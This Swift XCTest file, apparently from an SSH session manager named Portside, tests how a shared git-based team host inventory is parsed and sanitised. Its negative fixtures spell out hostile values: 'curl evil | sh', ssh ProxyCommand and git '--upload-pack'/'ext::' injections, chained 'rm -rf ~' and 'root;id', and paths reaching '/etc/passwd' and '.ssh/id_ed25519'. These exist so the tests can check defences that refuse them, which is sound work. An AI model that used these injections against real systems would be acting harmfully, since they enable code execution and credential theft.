import XCTest
@testable import Portside

/// Shared inventory: a team's manifest in git, subscribed read-only and shown
/// beside the user's own hosts. The git cases run real `git` against a bare
/// repository in a temp directory — a file path is as much a git remote as
/// `git@…`, and the fast-forward refusal is only worth trusting if git itself
/// is what refused.
final class SharedInventoryTests: XCTestCase {
    private var root: URL!
    private var libraryURL: URL { root.appendingPathComponent("library/portside.json") }
    private var bare: URL { root.appendingPathComponent("team.git") }
    private var work: URL { root.appendingPathComponent("work") }

    override func setUp() {
        super.setUp()
        root = FileManager.default.temporaryDirectory
            .appendingPathComponent("portside-shared-\(UUID().uuidString)", isDirectory: true)
        try? FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
    }

    override func tearDown() {
        try? FileManager.default.removeItem(at: root)
        super.tearDown()
    }

    // MARK: - Fixtures

    private func host(_ name: String, folder: String = "", id: UUID = UUID()) -> SessionEntry {
        var e = SessionEntry(name: name, folder: folder, hostname: "\(name).example.com")
        e.id = id
        return e
    }

    private func manifest(_ entries: [SessionEntry], folders: [String] = []) throws -> Data {
        try LibraryTransfer.encodeSessions(entries: entries, folders: folders, credentialProfiles: [])
    }

    @discardableResult
    private func git(_ args: [String], in dir: URL? = nil) throws -> String {
        try InventoryGit.run(["-c", "user.name=Test", "-c", "user.email=test@example.com",
                              "-c", "commit.gpgsign=false"] + args, in: dir)
    }

    /// A bare "team" repository with one commit carrying `entries`.
    private func publish(_ entries: [SessionEntry], message: String = "inventory") throws {
        if !FileManager.default.fileExists(atPath: bare.path) {
            try git(["init", "--quiet", "--bare", "--initial-branch=main", bare.path])
            try git(["clone", "--quiet", bare.path, work.path])
            try git(["checkout", "--quiet", "-B", "main"], in: work)
        }
        try manifest(entries).write(to: work.appendingPathComponent("portside.json"))
        try git(["add", "portside.json"], in: work)
        try git(["commit", "--quiet", "-m", message], in: work)
        try git(["push", "--quiet", "origin", "main"], in: work)
    }

    private func source(id: UUID = UUID()) -> InventorySource {
        InventorySource(id: id, name: "Platform Team", remote: bare.path)
    }

    // MARK: - Manifest

    func testManifestKeepsLocationAndDropsWhatActsOnThisMac() throws {
        var web = host("web01", folder: "prod/web")
        web.user = "deploy"
        web.port = 2222
        web.environment = .prod
        web.isProtected = true
        web.runOnConnect = "curl evil | sh"
        web.forwardAgent = true
        web.forwardX11 = true
        web.credentialProfileID = UUID()
        web.savePassword = true
        web.isFavorite = true

        let sourceID = UUID()
        let parsed = try SharedManifest.parse(manifest([web]), sourceID: sourceID)
        let e = try XCTUnwrap(parsed.entries.first)
        XCTAssertEqual(e.hostname, "web01.example.com")
        XCTAssertEqual(e.user, "deploy")
        XCTAssertEqual(e.port, 2222)
        XCTAssertEqual(e.folder, "prod/web")
        XCTAssertEqual(e.environment, .prod)
        XCTAssertTrue(e.isProtected)
        XCTAssertNil(e.runOnConnect)
        XCTAssertNil(e.forwardAgent, "the source must not be able to forward the user's agent")
        XCTAssertNil(e.forwardX11)
        XCTAssertNil(e.credentialProfileID)
        XCTAssertFalse(e.savePassword)
        XCTAssertFalse(e.isFavorite)
        XCTAssertEqual(e.id, SharedManifest.entryID(sourceID: sourceID, manifestID: web.id))
        XCTAssertEqual(parsed.skipped, 0)
    }

    /// Anything that would reach ssh as an option, or isn't an SSH host at all,
    /// is skipped and counted rather than shown.
    func testUnsafeAndNonHostRecordsAreSkipped() throws {
        var injected = host("x")
        injected.hostname = "-oProxyCommand=open -a Calculator"
        var badUser = host("y")
        badUser.user = "-oProxyCommand=x"
        var badAlias = host("z")
        badAlias.hostname = ""
        badAlias.sshAlias = "a;b"
        var container = host("c")
        container.kind = .container
        var empty = host("e")
        empty.hostname = ""
        let fine = host("ok")

        let parsed = try SharedManifest.parse(
            manifest([injected, badUser, badAlias, container, empty, fine]), sourceID: UUID())
        XCTAssertEqual(parsed.entries.map(\.name), ["ok"])
        XCTAssertEqual(parsed.skipped, 5)
    }

    /// A container reached over SSH is where a host is, plus which container:
    /// it's shared. What it runs is rebuilt from checked fields, never taken
    /// as a command, and a personal run-on-connect still doesn't come along.
    func testContainerOnAnSSHHostIsShared() throws {
        var box = host("babbage", folder: "containers")
        box.kind = .container
        box.user = "ops"
        box.identityFile = "~/.ssh/id_ed25519"
        box.container = ContainerTarget(engine: .podman, name: "ix-plex-plex-1", shell: "/usr/bin/bash", user: "app:app")
        box.runOnConnect = "curl evil | sh"

        let parsed = try SharedManifest.parse(manifest([box]), sourceID: UUID())
        let e = try XCTUnwrap(parsed.entries.first)
        XCTAssertEqual(e.kind, .container)
        XCTAssertEqual(e.hostname, "babbage.example.com")
        XCTAssertEqual(e.user, "ops")
        XCTAssertEqual(e.container, box.container)
        XCTAssertNil(e.runOnConnect)
        XCTAssertFalse(e.usesLocalTransport)
        XCTAssertEqual(e.postConnectCommand, "podman exec -it -u app:app ix-plex-plex-1 /usr/bin/bash")
        XCTAssertEqual(parsed.skipped, 0)
    }

    /// The exec is typed into the remote shell as the user, so every field
    /// that reaches it is held to what it can legitimately be. A container on
    /// this Mac (no host) runs its engine here and stays unshareable, and so
    /// does every other kind.
    func testContainerRecordsThatWouldDoMoreThanExecAreSkipped() throws {
        func box(_ name: String, _ change: (inout SessionEntry) -> Void) -> SessionEntry {
            var e = host(name)
            e.kind = .container
            e.container = ContainerTarget(engine: .docker, name: "web", shell: "sh", user: "")
            change(&e)
            return e
        }
        let records = [
            box("local") { $0.hostname = "" },
            box("no-target") { $0.container = nil },
            box("empty-name") { $0.container?.name = "" },
            box("chained-name") { $0.container?.name = "web; rm -rf ~" },
            box("option-name") { $0.container?.name = "--privileged" },
            box("command-shell") { $0.container?.shell = "sh -c 'curl x | sh'" },
            box("odd-shell") { $0.container?.shell = "/tmp/payload" },
            box("option-shell") { $0.container?.shell = "-c" },
            box("chained-user") { $0.container?.user = "root;id" },
            box("option-user") { $0.container?.user = "-uroot" },
            box("pod") { $0.kind = .kubernetes },
            box("serial") { $0.kind = .serial },
        ]
        let fine = box("fine") { _ in }

        let parsed = try SharedManifest.parse(manifest(records + [fine]), sourceID: UUID())
        XCTAssertEqual(parsed.entries.map(\.name), ["fine"])
        XCTAssertEqual(parsed.skipped, records.count)
    }

    func testFoldersCannotClimbOrHideControlCharacters() throws {
        let parsed = try SharedManifest.parse(
            manifest([host("a", folder: "../../etc/./lab\u{0}")], folders: ["/x//y/", ".."]),
            sourceID: UUID())
        XCTAssertEqual(parsed.entries.first?.folder, "etc/lab")
        XCTAssertEqual(parsed.folders, ["x/y"])
    }

    func testDuplicateIdsKeepTheFirst() throws {
        let id = UUID()
        let parsed = try SharedManifest.parse(manifest([host("first", id: id), host("second", id: id)]),
                                              sourceID: UUID())
        XCTAssertEqual(parsed.entries.map(\.name), ["first"])
    }

    func testNonManifestIsRefused() {
        XCTAssertThrowsError(try SharedManifest.parse(Data("{\"hello\":1}".utf8), sourceID: UUID()))
        XCTAssertThrowsError(try SharedManifest.parse(Data("not json".utf8), sourceID: UUID()))
    }

    /// Stable across pulls, distinct across subscriptions of the same repo.
    func testEntryIDsAreStableAndPerSource() {
        let manifestID = UUID(), a = UUID(), b = UUID()
        XCTAssertEqual(SharedManifest.entryID(sourceID: a, manifestID: manifestID),
                       SharedManifest.entryID(sourceID: a, manifestID: manifestID))
        XCTAssertNotEqual(SharedManifest.entryID(sourceID: a, manifestID: manifestID),
                          SharedManifest.entryID(sourceID: b, manifestID: manifestID))
        XCTAssertNotEqual(SharedManifest.entryID(sourceID: a, manifestID: manifestID), manifestID)
    }

    func testSourceValidation() {
        func problem(_ remote: String, ref: String = "main", path: String = "portside.json") -> String? {
            InventorySource(name: "T", remote: remote, ref: ref, path: path).validationProblem
        }
        XCTAssertNil(problem("git@github.com:team/inventory.git"))
        XCTAssertNil(problem("https://git.example.com/team/inv.git", path: "hosts/portside.json"))
        XCTAssertNotNil(problem("--upload-pack=touch /tmp/x"))
        XCTAssertNotNil(problem("ext::sh -c touch% /tmp/pwned"))
        XCTAssertNotNil(problem("ok", ref: "--orphan"))
        XCTAssertNotNil(problem("ok", ref: "a..b"))
        XCTAssertNotNil(problem("ok", path: "../../.ssh/id_ed25519"))
        XCTAssertNotNil(problem("ok", path: "/etc/passwd"))
        XCTAssertNotNil(InventorySource(name: " ", remote: "ok").validationProblem)
    }

    // MARK: - Overlays

    func testOverlayCanAddProtectionButNotLiftIt() {
        var published = host("db")
        published.isProtected = true
        var overlay = SharedOverlay(entryID: published.id)
        overlay.isProtected = false
        XCTAssertTrue(overlay.applied(to: published).isProtected)

        published.isProtected = false
        overlay.isProtected = true
        XCTAssertTrue(overlay.applied(to: published).isProtected)
    }

    // MARK: - Git, end to end

    @MainActor
    func testPullShowsHostsBesideYourOwnAndFastForwards() async throws {
        let webID = UUID()
        try publish([host("web01", folder: "prod", id: webID)])
        let store = SessionStore(fileURL: libraryURL)
        store.upsert(host("mine"))
        let src = source()
        XCTAssertNil(store.addInventorySource(src))

        await store.refreshInventorySource(id: src.id)
        XCTAssertNil(store.sharedState[src.id]?.error)
        XCTAssertEqual(store.sharedEntries.map(\.name), ["web01"])
        XCTAssertEqual(store.allEntries.map(\.name).sorted(), ["mine", "web01"])
        XCTAssertEqual(store.entries.map(\.name), ["mine"], "shared hosts never enter the user's own library")
        let sharedID = SharedManifest.entryID(sourceID: src.id, manifestID: webID)
        XCTAssertEqual(store.entry(id: sharedID)?.name, "web01")
        XCTAssertEqual(store.inventorySource(forEntry: sharedID)?.id, src.id)

        try publish([host("web01", folder: "prod", id: webID), host("web02", folder: "prod")], message: "add web02")
        await store.refreshInventorySource(id: src.id)
        XCTAssertEqual(store.sharedEntries.map(\.name).sorted(), ["web01", "web02"])
        XCTAssertEqual(store.entry(id: sharedID)?.name, "web01", "ids survive a pull")
    }

    /// A rewritten history is how a host would be slipped in unreviewed, so it
    /// is refused — and what was there stays.
    @MainActor
    func testForcePushIsRefusedAndPreviousContentsKept() async throws {
        try publish([host("web01")])
        let store = SessionStore(fileURL: libraryURL)
        let src = source()
        store.addInventorySource(src)
        await store.refreshInventorySource(id: src.id)
        XCTAssertEqual(store.sharedEntries.map(\.name), ["web01"])

        try manifest([host("sneaky")]).write(to: work.appendingPathComponent("portside.json"))
        try git(["add", "portside.json"], in: work)
        try git(["commit", "--quiet", "--amend", "-m", "rewritten"], in: work)
        try git(["push", "--quiet", "--force", "origin", "main"], in: work)

        await store.refreshInventorySource(id: src.id)
        let error = try XCTUnwrap(store.sharedState[src.id]?.error)
        XCTAssertTrue(error.contains("history"), error)
        XCTAssertEqual(store.sharedEntries.map(\.name), ["web01"])
    }

    /// A symlink in the repository is the publisher's choice; following it out
    /// of the clone would read any file the user can.
    @MainActor
    func testManifestSymlinkOutOfTheCloneIsRefused() async throws {
        try publish([host("web01")])
        let secret = root.appendingPathComponent("secret.json")
        try manifest([host("leaked")]).write(to: secret)
        try FileManager.default.removeItem(at: work.appendingPathComponent("portside.json"))
        try FileManager.default.createSymbolicLink(at: work.appendingPathComponent("portside.json"),
                                                   withDestinationURL: secret)
        try git(["add", "portside.json"], in: work)
        try git(["commit", "--quiet", "-m", "symlink"], in: work)
        try git(["push", "--quiet", "origin", "main"], in: work)

        let store = SessionStore(fileURL: libraryURL)
        let src = source()
        store.addInventorySource(src)
        await store.refreshInventorySource(id: src.id)
        XCTAssertNotNil(store.sharedState[src.id]?.error)
        XCTAssertTrue(store.sharedEntries.isEmpty)
    }

    @MainActor
    func testUnreachableRemoteReportsWithoutHanging() async throws {
        let store = SessionStore(fileURL: libraryURL)
        let src = InventorySource(name: "Gone", remote: root.appendingPathComponent("nope.git").path)
        store.addInventorySource(src)
        await store.refreshInventorySource(id: src.id)
        XCTAssertNotNil(store.sharedState[src.id]?.error)
        XCTAssertEqual(store.sharedState[src.id]?.isSyncing, false)
    }

    // MARK: - Store behaviour

    /// Edits to a shared host land in the overlay; what the source owns doesn't
    /// move, and survives a relaunch with no network.
    @MainActor
    func testEditsBecomeOverlaysAndPersistOffline() async throws {
        let webID = UUID()
        var published = host("web01", id: webID)
        published.isProtected = true
        try publish([published])
        let src = source()
        let profile = CredentialProfile(name: "ops")

        do {
            let store = SessionStore(fileURL: libraryURL)
            store.addInventorySource(src)
            store.upsert(profile)
            await store.refreshInventorySource(id: src.id)
            let id = SharedManifest.entryID(sourceID: src.id, manifestID: webID)

            var edited = try XCTUnwrap(store.entry(id: id))
            edited.hostname = "elsewhere.example.com"
            edited.isProtected = false
            edited.environment = .staging
            edited.credentialProfileID = profile.id
            store.upsert(edited)
            store.setFavorite(true, ids: [id])

            let now = try XCTUnwrap(store.entry(id: id))
            XCTAssertEqual(now.hostname, "web01.example.com", "the source owns the address")
            XCTAssertTrue(now.isProtected, "the source's protection can't be lifted")
            XCTAssertEqual(now.environment, .staging)
            XCTAssertEqual(now.credentialProfileID, profile.id)
            XCTAssertTrue(now.isFavorite)
            XCTAssertTrue(store.favoriteEntries.contains { $0.id == id })
        }

        // The remote goes away; the clone and the overlay are enough.
        try FileManager.default.removeItem(at: bare)
        let reopened = SessionStore(fileURL: libraryURL)
        let id = SharedManifest.entryID(sourceID: src.id, manifestID: webID)
        let entry = try XCTUnwrap(reopened.entry(id: id))
        XCTAssertEqual(entry.environment, .staging)
        XCTAssertTrue(entry.isFavorite)
        XCTAssertEqual(reopened.inventorySources.map(\.name), ["Platform Team"])
    }

    @MainActor
    func testSharedHostsCannotBeDeletedOrMovedAndRemovalCleansUp() async throws {
        let webID = UUID()
        try publish([host("web01", folder: "prod", id: webID)])
        let store = SessionStore(fileURL: libraryURL)
        let src = source()
        store.addInventorySource(src)
        await store.refreshInventorySource(id: src.id)
        let id = SharedManifest.entryID(sourceID: src.id, manifestID: webID)

        store.delete(ids: [id])
        store.move(entryIDs: [id], toFolder: "elsewhere")
        XCTAssertEqual(store.entry(id: id)?.folder, "prod")

        store.setEnvironment(.dev, ids: [id])
        XCTAssertNotNil(store.sharedOverlays[id])
        store.removeInventorySource(id: src.id)
        XCTAssertNil(store.entry(id: id))
        XCTAssertTrue(store.sharedOverlays.isEmpty)
        XCTAssertFalse(FileManager.default.fileExists(atPath: store.cloneDirectory(for: src.id).path))
    }

    /// Changing the branch is a new history on purpose, so it reclones rather
    /// than failing the fast-forward.
    @MainActor
    func testChangingTheBranchReclones() async throws {
        try publish([host("main-host")])
        try git(["checkout", "--quiet", "-b", "staging"], in: work)
        try manifest([host("staging-host")]).write(to: work.appendingPathComponent("portside.json"))
        try git(["commit", "--quiet", "-am", "staging"], in: work)
        try git(["push", "--quiet", "origin", "staging"], in: work)

        let store = SessionStore(fileURL: libraryURL)
        var src = source()
        store.addInventorySource(src)
        await store.refreshInventorySource(id: src.id)
        XCTAssertEqual(store.sharedEntries.map(\.name), ["main-host"])

        src.ref = "staging"
        XCTAssertNil(store.updateInventorySource(src))
        await store.refreshInventorySource(id: src.id)
        XCTAssertNil(store.sharedState[src.id]?.error)
        XCTAssertEqual(store.sharedEntries.map(\.name), ["staging-host"])
    }
}
